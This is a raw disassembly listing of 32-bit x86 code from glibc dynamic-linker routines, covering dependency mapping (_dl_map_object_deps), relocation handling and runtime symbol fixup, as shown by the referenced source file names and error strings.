mov eax, dword [arg_10h]
mov edx, str.__lazy_
test eax, eax
mov eax, 0x80a4f11
cmove edx, eax
mov dword [var_8h], edx
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x808008b
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str._nrelocation_processing:__s_s_n
call fcn.08081c40
mov esi, dword [var_4h_3]
jmp 0x807edee
mov dword [var_sp_ch], str.elf_machine_rel_relative
mov dword [var_8h], 0x288
mov dword [var_4h], str..._sysdeps_i386_dl_machine.h
mov dword [esp], str.__reloc__r_info___0xff___8
call fcn.0805efc0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_bp_4h], ebx
mov edx, dword [eax + 0x22c]
mov ebx, eax
add edx, dword [eax]
mov eax, dword [0x80aac74]
dec eax
mov ecx, edx
not eax
add edx, dword [ebx + 0x230]
and ecx, eax
and edx, eax
cmp ecx, edx
je 0x8080115
sub edx, ecx
mov dword [var_8h_2], 1
mov dword [esp], ecx
mov dword [var_4h_2], edx
call fcn.080547a0
test eax, eax
js 0x808011a
mov ebx, dword [var_bp_4h]
leave
ret
call fcn.08048b20
xor ecx, ecx
mov dword [esp], 0x80a4400
mov edx, dword [ebx + 4]
mov eax, dword [eax]
call fcn.08081200
lea esi, [esi]
lea edi, [edi]
push ebp
shl ecx, 5
mov ebp, esp
add ecx, str.unexpected_reloc_type_0x
sub esp, 0x34
mov dword [var_ch_2], ebx
mov dword [var_bp_8h], esi
mov dword [var_4h_3], ecx
mov ebx, edx
lea esi, [var_2ch_2]
mov dword [ebp - 4], edi
mov dword [esp], esi
mov edi, eax
call fcn.080773c0
mov edx, ebx
xor ecx, ecx
and ebx, 0xf
shr edx, 4
and edx, 0xf
movzx edx, byte [edx + 0x80a0960]
mov byte [eax], dl
movzx edx, byte [ebx + 0x80a0960]
inc eax
mov byte [eax + 1], 0
mov byte [eax], dl
xor eax, eax
mov dword [esp], esi
mov edx, dword [edi + 4]
call fcn.08081200
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, 1
mov ebp, esp
sub esp, 0x18
mov dword [var_ch_3], ebx
mov dword [ebp - 8], esi
mov dword [ebp - 4], edi
mov ebx, dword [var_4h_3]
mov esi, 3
mov edi, 3
mov eax, dword [ebx + 8]
mov edx, dword [ebx + 0x10]
mov dword [var_8h_3], eax
mov eax, dword [ebx + 4]
mov dword [var_4h_4], eax
mov eax, dword [ebx]
movzx eax, byte [eax + 0x174]
and esi, eax
and edi, eax
mov eax, esi
test al, al
cmovne ecx, edi
mov dword [esp], ecx
mov eax, dword [ebx]
xor ecx, ecx
call fcn.0807cfa0
mov dword [ebx + 0x14], eax
sub esp, 0xc
mov edi, dword [ebp - 4]
mov ebx, dword [var_ch_3]
mov esi, dword [ebp - 8]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
lea esi, [eax + 4]
push ebx
mov dword [eax], edx
movzx eax, byte [edx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [edx + 0x174], al
mov eax, dword [edx + 0x1d8]
test eax, eax
je 0x8080276
mov edx, dword [eax + 4]
lea ebx, [eax + 4]
test edx, edx
je 0x8080276
test byte [edx + 0x174], 0x60
je 0x8080282
add ebx, 4
mov edx, dword [ebx]
test edx, edx
jne 0x8080264
sub esi, edi
sar esi, 2
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
mov eax, esi
call fcn.08080230
lea esi, [esi + eax*4]
jmp 0x808026d
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x94
mov dword [var_48h], ecx
mov dword [var_44h], edx
mov dword [var_40h], eax
mov edx, dword [var_40h]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x28]
mov ecx, dword [var_40h]
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
mov dword [eax + 4], edx
mov dword [var_10h], eax
mov dword [eax], 0
lea edx, [eax + 0xc]
mov dword [var_14h], 1
mov dword [eax + 8], edx
movzx eax, byte [ecx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [ecx + 0x174], al
mov ebx, dword [var_48h]
mov dword [var_50h], 0
cmp dword [var_50h], ebx
jae 0x8080349
mov edi, dword [var_14h]
mov eax, dword [var_50h]
mov edx, dword [var_44h]
mov ecx, dword [var_10h]
mov esi, dword [edx + eax*4]
lea eax, [edi + edi*2]
inc edi
shl eax, 2
mov dword [var_8ch], edi
lea edx, [eax + ecx + 0xc]
mov dword [ecx + eax], 0
mov dword [var_14h], edi
mov dword [ecx + eax + 4], esi
mov dword [ecx + eax + 8], edx
movzx eax, byte [esi + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [esi + 0x174], al
mov ecx, dword [var_48h]
inc dword [var_50h]
cmp dword [var_50h], ecx
jb 0x80802f9
mov eax, dword [var_14h]
mov esi, dword [var_10h]
lea eax, [eax + eax*2]
lea eax, [esi + eax*4 - 0xc]
mov dword [eax + 8], 0
mov dword [var_4ch], eax
call fcn.08048b20
test esi, esi
mov dword [var_38h], 0
mov ebx, dword [eax]
mov dword [var_58h], 0
mov dword [eax], 0
mov dword [var_54h], ebx
mov ebx, esi
je 0x8080593
mov esi, dword [ebx + 4]
mov dword [var_60h], 0
mov dword [var_64h], 0
mov dword [ebx], 1
mov eax, dword [esi + 0x150]
mov dword [var_5ch], esi
test eax, eax
jne 0x80803e4
mov eax, dword [esi + 0x1d8]
test eax, eax
jne 0x80803e4
mov eax, dword [var_40h]
cmp esi, eax
je 0x80803e4
movzx eax, word [esi + 0x14e]
test ax, ax
je 0x80803e4
movzx eax, ax
lea eax, [eax*4 + 0x12]
and eax, 0xffffc
sub esp, eax
lea edx, [var_1fh]
and edx, 0xfffffff0
mov dword [var_60h], edx
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 0x1c]
test eax, eax
jne 0x8080406
mov eax, dword [ecx + 0xe8]
test eax, eax
jne 0x8080406
mov eax, dword [ecx + 0xe0]
test eax, eax
je 0x80804f4
mov esi, dword [var_5ch]
mov edx, dword [arg_ch]
mov eax, dword [esi + 0x2c]
mov ecx, dword [esi + 8]
mov eax, dword [eax + 4]
mov dword [var_70h], ecx
mov dword [var_6ch], ebx
mov dword [var_2ch], edx
mov dword [var_34h], esi
mov dword [var_68h], eax
mov dword [var_28h], eax
mov eax, dword [arg_8h]
mov dword [var_30h], eax
mov eax, dword [ecx]
test eax, eax
je 0x80804f4
cmp eax, 1
jne 0x8080bc8
mov eax, dword [var_70h]
mov esi, dword [var_68h]
add esi, dword [eax + 4]
mov dword [var_4h], 0x24
mov dword [esp], esi
mov edi, esi
call fcn.08076ce0
test eax, eax
jne 0x8080a97
lea eax, [var_34h]
lea edx, [var_38h]
mov ecx, 0x80801c0
mov dword [esp], eax
mov dword [var_24h], edi
lea eax, [var_3ch]
call fcn.08081410
mov edx, dword [var_38h]
sub esp, 4
test edx, edx
jne 0x8080a80
mov edx, dword [var_20h]
test byte [edx + 0x174], 0x60
jne 0x80804cf
mov ecx, dword [var_4ch]
sub esp, 0x1c
lea eax, [var_1fh_2]
and eax, 0xfffffff0
mov dword [eax], 0
mov dword [eax + 8], 0
mov dword [eax + 4], edx
mov dword [ecx + 8], eax
mov dword [var_4ch], eax
inc dword [var_14h]
movzx eax, byte [edx + 0x174]
and eax, 0xffffff9f
or eax, 0x20
mov byte [edx + 0x174], al
mov eax, dword [var_60h]
test eax, eax
je 0x80804e3
mov esi, dword [var_64h]
mov eax, dword [var_60h]
mov dword [eax + esi*4], edx
inc esi
mov dword [var_64h], esi
add dword [var_70h], 8
mov edx, dword [var_70h]
mov eax, dword [edx]
test eax, eax
jne 0x8080437
mov eax, dword [var_60h]
test eax, eax
je 0x8080578
mov ecx, dword [var_64h]
mov esi, dword [var_60h]
mov dword [esi + ecx*4], 0
inc ecx
lea eax, [ecx*8 + 4]
mov dword [var_64h], ecx
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
mov eax, dword [var_5ch]
test edx, edx
mov dword [eax + 0x1d8], edx
je 0x8080a6e
mov eax, dword [var_64h]
mov esi, dword [var_5ch]
lea edi, [edx + 4]
cld
shl eax, 2
mov dword [edx], esi
mov esi, dword [var_60h]
mov ecx, eax
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov edx, dword [var_5ch]
mov esi, dword [edx + 0x1d8]
lea edi, [esi + eax + 4]
shr eax, 2
mov ecx, eax
xor eax, eax
test eax, eax
rep movsd dword es:[edi], dword ptr [esi]
je 0x808056d
movzx eax, word [esi]
add esi, 2
mov word [edi], ax
add edi, 2
xor eax, eax
test eax, eax
je 0x8080578
movzx eax, byte [esi]
mov byte [edi], al
mov edi, dword [ebx]
test edi, edi
je 0x808058b
mov ebx, dword [ebx + 8]
test ebx, ebx
je 0x8080593
mov esi, dword [ebx]
test esi, esi
jne 0x808057e
test ebx, ebx
jne 0x8080388
call fcn.08048b20
mov ecx, dword [eax]
test ecx, ecx
jne 0x80805aa
mov edx, dword [var_54h]
test edx, edx
je 0x80805aa
mov ebx, dword [var_54h]
mov dword [eax], ebx
mov esi, dword [var_40h]
mov edx, dword [esi + 0x1d8]
test edx, edx
je 0x80805c9
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x8080a33
mov eax, dword [var_14h]
lea eax, [eax*8 + 4]
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [var_40h]
test eax, eax
mov dword [edx + 0x1d8], eax
je 0x8080a2c
mov edx, dword [var_14h]
mov ebx, dword [var_40h]
lea eax, [eax + edx*4 + 4]
mov dword [ebx + 0x154], edx
mov dword [var_14h], 0
mov dword [ebx + 0x150], eax
mov ebx, dword [var_10h]
test ebx, ebx
je 0x8080642
mov eax, dword [arg_8h]
test eax, eax
jne 0x8080a0e
mov esi, dword [ebx + 4]
mov ecx, dword [var_40h]
mov edx, dword [var_14h]
mov eax, dword [ecx + 0x150]
mov dword [eax + edx*4], esi
mov esi, dword [ebx + 4]
inc edx
mov dword [var_14h], edx
and byte [esi + 0x174], 0x9f
mov ebx, dword [ebx + 8]
test ebx, ebx
jne 0x8080610
test byte [0x80aac11], 2
jne 0x8080899
mov edx, dword [var_40h]
mov esi, dword [edx + 0x150]
mov eax, dword [var_40h]
cmp dword [esi], eax
jne 0x8080875
mov edx, dword [var_40h]
mov dword [var_50h], 0
mov edx, dword [edx + 0x1e0]
cmp dword [var_50h], edx
mov dword [var_90h], edx
jae 0x8080867
mov ecx, dword [var_14h]
mov dword [var_8ch], ecx
mov edi, 1
cmp edi, dword [var_8ch]
jae 0x80806b9
mov ebx, dword [var_40h]
mov edx, dword [ebx + 0x1e4]
mov ecx, dword [var_50h]
mov eax, dword [esi + edi*4]
cmp eax, dword [edx + ecx*4]
je 0x808081f
inc edi
cmp edi, dword [var_8ch]
jb 0x80806a1
inc dword [var_50h]
mov ecx, dword [var_90h]
cmp dword [var_50h], ecx
jb 0x808068b
mov ecx, dword [var_8ch]
mov eax, dword [var_40h]
cld
shl ecx, 2
mov edi, dword [eax + 0x1d8]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_50h], 1
mov edx, dword [var_14h]
cmp dword [var_50h], edx
mov dword [var_8ch], edx
jae 0x8080811
mov edx, dword [eax + 0x1d8]
mov ecx, dword [var_40h]
mov esi, dword [var_50h]
mov dword [var_80h], 1
mov eax, dword [ecx + 0x150]
mov ebx, dword [eax + esi*4]
cmp dword [edx + 4], ebx
je 0x808072b
lea esi, [esi]
inc dword [var_80h]
mov eax, dword [var_80h]
cmp dword [edx + eax*4], ebx
jne 0x8080720
mov edi, dword [var_80h]
inc edi
cmp edi, dword [var_8ch]
jae 0x808077d
mov ecx, dword [var_80h]
shl ecx, 2
neg ecx
mov dword [var_88h], ecx
mov eax, dword [edx + edi*4]
mov esi, dword [eax + 0x1d8]
test esi, esi
je 0x8080774
mov eax, dword [esi]
test eax, eax
je 0x8080774
mov ecx, dword [var_88h]
lea ecx, [ecx + edi*4]
mov dword [var_84h], ecx
add esi, 4
cmp eax, ebx
je 0x80807c7
mov eax, dword [esi]
test eax, eax
jne 0x8080767
inc edi
cmp edi, dword [var_8ch]
jb 0x8080745
inc dword [var_50h]
mov eax, dword [var_8ch]
cmp dword [var_50h], eax
jb 0x80806fe
mov eax, dword [var_58h]
mov ebx, dword [var_8ch]
test eax, eax
mov dword [edx + ebx*4], 0
jne 0x80807ad
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov ecx, dword [var_38h]
xor eax, eax
mov edx, dword [var_3ch]
cmp dword [var_58h], 0xffffffff
cmovne eax, dword [var_58h]
mov dword [esp], ecx
xor ecx, ecx
call fcn.08081200
mov eax, dword [var_84h]
mov ecx, dword [var_80h]
mov esi, dword [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
add eax, 4
mov dword [esp], eax
call fcn.08053690
sub dword [var_88h], 4
mov eax, dword [var_40h]
mov ecx, dword [var_80h]
mov edx, dword [eax + 0x1d8]
mov dword [edx + ecx*4], esi
mov esi, dword [var_14h]
inc ecx
mov dword [var_80h], ecx
mov dword [var_8ch], esi
jmp 0x8080774
mov ecx, dword [var_40h]
mov edx, dword [ecx + 0x1d8]
jmp 0x808078f
mov edi, ecx
dec dword [eax + 0x170]
inc edi
cmp edi, dword [var_90h]
jae 0x8080840
mov eax, dword [edx + edi*4]
mov dword [edx + edi*4 - 4], eax
inc edi
cmp edi, dword [var_90h]
jb 0x8080830
mov eax, dword [var_90h]
dec dword [var_50h]
mov ebx, dword [var_40h]
mov edx, dword [var_14h]
dec eax
mov dword [ebx + 0x1e0], eax
mov dword [var_8ch], edx
mov dword [var_90h], eax
jmp 0x80806b9
mov ebx, dword [var_14h]
mov dword [var_8ch], ebx
jmp 0x80806c7
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x22e
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.map__l_searchlist.r_list_0___map
call fcn.0805efc0
mov ebx, dword [var_40h]
cmp ebx, dword [0x80aac58]
je 0x80808b2
mov ecx, dword [var_40h]
mov esi, dword [ecx + 0x150]
jmp 0x8080658
mov esi, dword [var_14h]
mov dword [var_50h], 0
cmp dword [var_50h], esi
mov dword [var_8ch], esi
jae 0x8080a00
mov esi, dword [ebx + 0x150]
mov eax, dword [var_50h]
mov ebx, dword [esi + eax*4]
cmp ebx, dword [var_40h]
je 0x8080992
mov eax, dword [ebx + 0x1b8]
test eax, eax
je 0x80808f5
mov edi, dword [eax + 4]
test edi, edi
jne 0x8080992
mov ecx, dword [ebx + 0xe8]
test ecx, ecx
jne 0x80809e6
mov edx, dword [ebx + 0xe0]
test edx, edx
jne 0x80809e6
mov edx, dword [var_40h]
mov eax, dword [edx + 0x1d8]
mov edx, ebx
call fcn.08080230
cmp eax, dword [var_14h]
mov esi, eax
ja 0x80809c2
xor edx, edx
cmp edx, eax
jae 0x808094a
mov ecx, dword [var_40h]
mov eax, dword [ecx + 0x1d8]
mov eax, dword [eax + edx*4]
inc edx
and byte [eax + 0x174], 0x9f
cmp edx, esi
jb 0x8080932
lea eax, [esi*4]
mov dword [var_7ch], eax
add eax, 8
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [ebx + 0x1b8], eax
je 0x80809a9
mov ebx, dword [var_40h]
mov ecx, dword [var_7ch]
lea edi, [eax + 8]
mov dword [eax], edi
mov dword [eax + 4], esi
cld
mov esi, dword [ebx + 0x1d8]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, dword [var_14h]
mov dword [var_8ch], esi
mov esi, dword [ebx + 0x150]
inc dword [var_50h]
mov eax, dword [var_8ch]
cmp dword [var_50h], eax
jb 0x80808d1
jmp 0x8080658
mov ecx, dword [var_40h]
mov edx, dword [ecx + 4]
mov dword [esp], str.cannot_allocate_symbol_search_list
xor ecx, ecx
mov eax, 0xc
jmp 0x80807c2
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x21a
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.cnt___nlist
jmp 0x8080894
mov edx, dword [ebx + 4]
xor ecx, ecx
mov eax, 0x16
mov dword [esp], str.Filters_not_supported_with_LD_TRACE_PRELINKING
jmp 0x80807c2
lea esi, [esi]
mov ebx, dword [var_40h]
mov esi, dword [ebx + 0x150]
jmp 0x8080658
mov esi, dword [ebx + 4]
test byte [esi + 0x175], 2
je 0x808061e
mov eax, dword [var_40h]
dec dword [eax + 0x154]
jmp 0x8080634
mov ecx, edx
jmp 0x80809ac
mov eax, dword [esi + 0x150]
test eax, eax
jne 0x8080a4a
mov dword [esp], edx
call fcn.08051180
jmp 0x80805c9
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x1e2
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.map__l_searchlist.r_list____void__0_
jmp 0x8080894
mov ecx, dword [var_40h]
mov edx, dword [ecx + 4]
mov dword [esp], str.cannot_allocate_dependency_list
jmp 0x80809b6
test eax, eax
mov dword [var_58h], 0xffffffff
je 0x8080593
mov dword [var_58h], eax
jmp 0x8080593
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.0807aeb0
test eax, eax
je 0x8080463
mov eax, dword [0x80a95f4]
test eax, eax
jne 0x8080bb6
mov dword [esp], esi
call fcn.08053400
mov ecx, dword [var_74h]
mov edi, eax
test ecx, ecx
je 0x8080b1f
mov edx, dword [var_5ch]
mov eax, dword [edx + 0x190]
test eax, eax
jne 0x8080b9e
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x8080b7a
call fcn.08083280
mov ecx, dword [var_5ch]
test eax, eax
mov dword [ecx + 0x190], eax
je 0x8080b76
cmp eax, 0xffffffff
je 0x8080b76
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul eax, dword [var_74h]
lea eax, [eax + edi]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_sp_ch], 0
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [var_8h], eax
mov eax, dword [var_5ch]
mov dword [esp], eax
call fcn.0807af60
cmp byte [eax], 0
mov edi, eax
jne 0x8080463
test byte [0x80aac10], 1
je 0x80804e3
mov dword [var_4h], esi
mov dword [esp], str.cannot_load_auxiliary___s_because_of_empty_dynamic_string_token_substitution_n
call fcn.08081c40
jmp 0x80804e3
xor edx, edx
jmp 0x8080b0b
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0xf0
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str._l___l_name_0___0
jmp 0x8080894
xor edx, edx
cmp eax, 0xffffffff
je 0x8080b0b
mov dword [esp], eax
call fcn.08053400
jmp 0x8080b09
xor ecx, ecx
mov edx, edi
mov dword [esp], str.DST_not_allowed_in_SUID_SGID_programs
xor eax, eax
jmp 0x80807c2
cmp eax, 0x7ffffffd
je 0x8080bda
cmp eax, 0x7fffffff
jne 0x80804e3
mov edx, dword [var_70h]
mov esi, dword [var_68h]
add esi, dword [edx + 4]
mov dword [var_4h], 0x24
mov dword [esp], esi
mov edi, esi
call fcn.08076ce0
test eax, eax
jne 0x8080e15
mov edx, dword [var_70h]
mov dword [var_24h], edi
cmp dword [edx], 0x7ffffffd
je 0x8080da8
test byte [0x80aac10], 1
jne 0x8080d7d
lea eax, [var_34h]
lea edx, [var_38h]
mov ecx, 0x80801c0
mov dword [esp], eax
lea eax, [var_3ch]
call fcn.08081410
mov edx, dword [var_38h]
sub esp, 4
test edx, edx
jne 0x8080a80
mov edx, dword [var_6ch]
sub esp, 0x1c
lea edi, [var_1fh_2]
and edi, 0xfffffff0
mov eax, dword [edx]
mov dword [edi], eax
mov eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [var_20h]
mov dword [edx], 0
mov dword [edx + 4], eax
mov eax, dword [var_60h]
test eax, eax
je 0x8080c80
mov ecx, dword [var_64h]
mov eax, dword [var_20h]
mov esi, dword [var_60h]
mov dword [esi + ecx*4], eax
inc ecx
mov dword [var_64h], ecx
mov ecx, dword [var_20h]
movzx eax, byte [ecx + 0x174]
mov esi, ecx
test al, 0x60
je 0x8080d52
mov eax, dword [edi + 8]
mov edx, edi
test eax, eax
je 0x8080d4a
mov eax, dword [edx + 8]
cmp dword [eax + 4], esi
je 0x8080cb4
mov edx, eax
mov eax, dword [eax + 8]
test eax, eax
jne 0x8080ca1
xor eax, eax
test eax, eax
je 0x8080d32
mov eax, dword [var_6ch]
mov dword [eax + 8], edi
mov eax, dword [edx + 8]
cmp dword [var_4ch], eax
mov eax, dword [var_4ch]
cmove eax, edx
mov dword [var_4ch], eax
mov eax, dword [edx + 8]
mov eax, dword [eax + 8]
mov dword [edx + 8], eax
mov edx, dword [esi + 0x10]
test edx, edx
je 0x8080ce6
mov eax, dword [esi + 0xc]
mov dword [edx + 0xc], eax
mov ecx, dword [var_20h]
mov edx, dword [ecx + 0xc]
test edx, edx
je 0x8080cf6
mov eax, dword [ecx + 0x10]
mov dword [edx + 0x10], eax
mov ecx, dword [var_20h]
mov eax, dword [edi + 4]
mov eax, dword [eax + 0x10]
mov dword [ecx + 0x10], eax
mov eax, dword [var_20h]
mov edx, dword [edi + 4]
mov dword [edx + 0x10], eax
mov ecx, dword [var_20h]
mov eax, dword [ecx + 0x10]
test eax, eax
je 0x8080d18
mov dword [eax + 0xc], ecx
mov ecx, dword [var_20h]
mov eax, dword [edi + 4]
mov dword [ecx + 0xc], eax
mov eax, dword [var_4ch]
cmp dword [var_6ch], eax
mov dword [var_6ch], edi
cmove eax, edi
mov dword [var_4ch], eax
jmp 0x80804e3
mov eax, dword [edi]
mov edx, dword [var_6ch]
mov dword [edx], eax
mov eax, dword [edi + 4]
mov dword [edx + 4], eax
mov eax, dword [edi + 8]
mov dword [edx + 8], eax
jmp 0x80804e3
mov eax, dword [edi + 8]
jmp 0x8080cb4
mov esi, dword [var_6ch]
and eax, 0xffffff9f
inc dword [var_14h]
or eax, 0x20
mov dword [esi + 8], edi
mov byte [ecx + 0x174], al
mov ecx, dword [var_20h]
mov edx, dword [ecx + 0x10]
test edx, edx
je 0x8080ce6
mov eax, dword [ecx + 0xc]
jmp 0x8080ce0
mov esi, dword [var_5ch]
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x8080d8f
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], edi
mov dword [esp], str.load_filtered_object_s_requested_by_file_s_n
call fcn.08081c40
jmp 0x8080c1c
test byte [0x80aac10], 1
jne 0x8080ded
lea eax, [var_34h]
mov ecx, 0x80801c0
lea edx, [var_38h]
mov dword [esp], eax
lea eax, [var_3ch]
call fcn.08081410
mov eax, dword [var_38h]
sub esp, 4
test eax, eax
je 0x8080c40
cmp eax, str.out_of_memory
je 0x80804e3
mov dword [esp], eax
call fcn.08051180
jmp 0x80804e3
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x8080dff
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], edi
mov dword [esp], str.load_auxiliary_object_s_requested_by_file_s_n
call fcn.08081c40
jmp 0x8080db1
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.0807aeb0
test eax, eax
je 0x8080bfd
mov eax, dword [0x80a95f4]
test eax, eax
jne 0x8080bb6
mov dword [esp], esi
call fcn.08053400
mov ecx, dword [var_78h]
mov edi, eax
test ecx, ecx
je 0x8080e9d
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 0x190]
test eax, eax
jne 0x8080f0a
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x8080ef5
call fcn.08083280
mov edx, dword [var_5ch]
test eax, eax
mov dword [edx + 0x190], eax
je 0x8080ef1
cmp eax, 0xffffffff
je 0x8080ef1
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul eax, dword [var_78h]
lea eax, [eax + edi]
add eax, 0x12
mov ecx, dword [var_5ch]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_sp_ch], 0
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.0807af60
cmp byte [eax], 0
mov edi, eax
jne 0x8080bfd
mov eax, dword [var_70h]
cmp dword [eax], 0x7ffffffd
jne 0x8080b54
mov dword [esp], str.empty_dynamics_string_token_substitution
xor ecx, ecx
mov edx, esi
jmp 0x8080bc1
xor edx, edx
jmp 0x8080e89
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x11c
jmp 0x8080b8a
xor edx, edx
cmp eax, 0xffffffff
je 0x8080e89
mov dword [esp], eax
call fcn.08053400
jmp 0x8080e87
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
sub esp, 0x28
mov ecx, dword [eax + 0x30]
mov eax, dword [eax + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_14h], eax
mov eax, dword [esi + 0x74]
add edx, dword [eax + 4]
mov eax, dword [edx + 4]
mov edx, dword [edx]
mov ebx, eax
shr ebx, 8
mov dword [var_18h], ebx
shl ebx, 4
add ebx, dword [ecx + 4]
mov ecx, dword [esi]
add edx, ecx
mov dword [var_10h], ebx
cmp al, 7
mov dword [var_1ch], edx
jne 0x8081024
movzx eax, byte [ebx + 0xd]
mov edi, ebx
and eax, 3
mov dword [var_20h], eax
jne 0x808101d
mov edx, dword [esi + 0xdc]
xor eax, eax
test edx, edx
je 0x8080fb3
mov eax, dword [edx + 4]
mov edx, dword [var_18h_2]
movzx eax, word [eax + edx*2]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
add eax, dword [esi + 0x17c]
mov ecx, dword [eax + 4]
test ecx, ecx
cmove eax, dword [var_20h]
mov ebx, dword [edi]
lea ecx, [var_10h_2]
mov edx, esi
mov dword [var_4h], eax
add dword [var_14h_2], ebx
mov dword [esp + 0x10], 0
mov eax, dword [esi + 0x1b4]
mov dword [var_ch], 1
mov dword [var_8h], 1
mov dword [esp], eax
mov eax, dword [var_14h_2]
call fcn.0807e450
mov edx, dword [var_10h_2]
sub esp, 0x14
mov ecx, eax
xor eax, eax
test edx, edx
je 0x8081001
test ecx, ecx
je 0x8081018
mov eax, dword [edx + 4]
add eax, dword [ecx]
mov edx, dword [0x80aac30]
test edx, edx
jne 0x8081010
mov edx, dword [var_1ch_2]
mov dword [edx], eax
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edx + 4]
jmp 0x8081001
mov eax, ecx
add eax, dword [ebx + 4]
jmp 0x8081001
mov dword [var_ch], 0x80a4678
mov dword [var_8h], 0x4c
mov dword [var_4h], str.dl_runtime.c
mov dword [esp], str.__reloc__r_info___0xff___7
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
mov ebx, edx
shr edx, 3
sub esp, 0x28
mov eax, dword [eax + 0x188]
mov dword [var_14h_2], ecx
lea edx, [eax + edx*4]
mov edi, dword [edx]
mov dword [var_18h_2], edx
test edi, edi
jne 0x808113a
mov eax, dword [esi + 0x2c]
mov edx, dword [esi + 0x30]
mov eax, dword [eax + 4]
mov dword [var_1ch_2], eax
mov eax, dword [esi + 0x74]
add ebx, dword [eax + 4]
mov eax, dword [ebx + 4]
mov ecx, eax
shr ecx, 8
mov dword [var_20h], ecx
shl ecx, 4
add ecx, dword [edx + 4]
cmp al, 7
mov dword [var_10h_2], ecx
jne 0x808115f
test byte [ecx + 0xd], 3
mov ebx, ecx
jne 0x8081158
mov edx, dword [esi + 0xdc]
xor eax, eax
test edx, edx
je 0x80810e1
mov eax, dword [edx + 4]
mov edx, dword [var_20h]
movzx eax, word [eax + edx*2]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
add eax, dword [esi + 0x17c]
mov edx, dword [eax + 4]
test edx, edx
cmove eax, edi
mov ecx, dword [ebx]
mov edx, esi
mov dword [var_4h_2], eax
mov eax, dword [esi + 0x1b4]
add dword [var_1ch_2], ecx
mov dword [var_sp_10h], 0
lea ecx, [var_10h_2]
mov dword [var_ch_2], 1
mov dword [var_8h_2], 1
mov dword [esp], eax
mov eax, dword [var_1ch_2]
call fcn.0807e450
mov edx, dword [var_10h_2]
sub esp, 0x14
test edx, edx
je 0x808112b
test eax, eax
je 0x8081153
mov edi, dword [edx + 4]
add edi, dword [eax]
mov ebx, dword [0x80aac30]
test ebx, ebx
jne 0x808113a
mov eax, dword [var_18h_2]
mov dword [eax], edi
mov edx, dword [var_14h_2]
mov dword [var_4h_2], edi
mov dword [esp], edx
call fcn.08082c50
lea esp, [var_bp_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [edx + 4]
jmp 0x808112b
mov edi, dword [ecx + 4]
add edi, dword [esi]
jmp 0x808112b
mov dword [var_ch_2], str.profile_fixup
mov dword [var_8h_2], 0xa0
mov dword [var_4h_2], str.dl_runtime.c
mov dword [esp], str.__reloc__r_info___0xff___7
call fcn.0805efc0
